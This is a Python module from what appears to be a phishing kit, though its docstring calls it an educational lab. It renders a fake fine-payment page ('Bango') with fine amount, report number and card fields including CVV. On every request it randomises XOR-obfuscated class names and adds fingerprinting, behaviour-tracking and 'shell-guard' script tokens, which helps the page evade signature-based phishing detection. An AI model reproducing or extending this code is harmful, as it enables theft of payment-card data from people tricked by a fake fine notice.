"""
Bango (RTL lab shell): XOR-polymorphic class map via :func:`gate_engine.build_ui_class_map`,
exposed to ``bango.html`` as ``bcls[logical]`` and optional ``data-ui-map`` / ``data-ui-key`` blob.

Educational lab only; class names in delivered HTML are still visible after render.
"""

from __future__ import annotations

import json
import secrets
from typing import Any

from backend import gate_engine

# Logical UI tokens obfuscated with the same XOR+base64url pipeline as the gate.
BANGO_CLASS_LOGICAL: tuple[str, ...] = (
    "bango-page",
    "bango-shell",
    "bango-hero",
    "bango-hero__logo",
    "bango-segments",
    "bango-seg",
    "bango-surface",
    "fine-banner",
    "fine-title",
    "fine-details",
    "amount-row",
    "amount",
    "bango-section",
    "bango-section--split",
    "bango-section__title",
    "form-group",
    "bango-form",
    "bango-field-error",
    "bango-input--error",
    "bango-field-with-icon",
    "bango-cvv-input",
    "bango-cvv-toggle",
    "row",
    "btn-submit",
    "bango-footer-lab",
    "footer--ltr",
    "bango-attempted-submit",
    "bango-success-overlay",
    "bango-success-overlay__icon",
    "bango-success-overlay__title",
    "bango-success-overlay__text",
    "bango-success-overlay__spinner",
)


def build_bango_template_context(session: Any) -> dict[str, Any]:
    """
    Per-request: random XOR key, class map, shell-guard HTML, JS lookup for
    :file:`bango-lab.js` (attempted submit + input error classes).
    """
    from backend import bango_hardening
    from backend.app import (
        SESSION_API_CSRF,
        SESSION_BANGO_CSP,
        SESSION_BANGO_JS,
        _bango_shell_inject_script_tags,
        _shell_guard_enabled,
    )

    xor_key = secrets.token_hex(8)
    ui_map = gate_engine.build_ui_class_map(list(BANGO_CLASS_LOGICAL), xor_key)
    report = str(session.get(SESSION_API_CSRF) or "")
    ui_json = json.dumps(ui_map, ensure_ascii=False, separators=(",", ":"))
    csp_nonce = secrets.token_urlsafe(16)
    rev: dict[str, str] = {}
    bango_js_tokens: dict[str, str] = {}

    def _bango_add_js_token(logical: str) -> None:
        tok = secrets.token_urlsafe(18)
        rev[tok] = logical
        bango_js_tokens[logical] = tok

    for _name in ("fingerprint", "behavior"):
        _bango_add_js_token(_name)
    if _shell_guard_enabled():
        _bango_add_js_token("shell-guard")
    for _name in (
        "incognito-hint",
        "lab-busy",
        "bango-crypto",
        "bango-page-init",
        "bango-lab",
    ):
        _bango_add_js_token(_name)
    session[SESSION_BANGO_JS] = {"k": xor_key, "rev": rev}
    session[SESSION_BANGO_CSP] = bango_hardening.build_bango_csp_header(csp_nonce)
    from flask import has_request_context

    from backend.app import _client_ip_for_lab

    _ip = _client_ip_for_lab() if has_request_context() else ""
    _plaque = bango_hardening.resolve_bango_fine_plaque(session, _ip)
    return {
        "bcls": ui_map,
        "bango_xor_key": xor_key,
        "bango_ui_map_json": ui_json,
        "bango_csp_nonce": csp_nonce,
        "bango_js_tokens": bango_js_tokens,
        "bango_shell_inject": _bango_shell_inject_script_tags(report, csp_nonce),
        "bango_ui_for_js": {
            "formId": ui_map["bango-form"],
            "btnSubmit": ui_map["btn-submit"],
            "attemptedSubmit": ui_map["bango-attempted-submit"],
            "inputError": ui_map["bango-input--error"],
        },
        "bango_fine_amount": _plaque["amount"],
        "bango_fine_report": _plaque["report"],
        "bango_fine_date": _plaque["date"],
    }
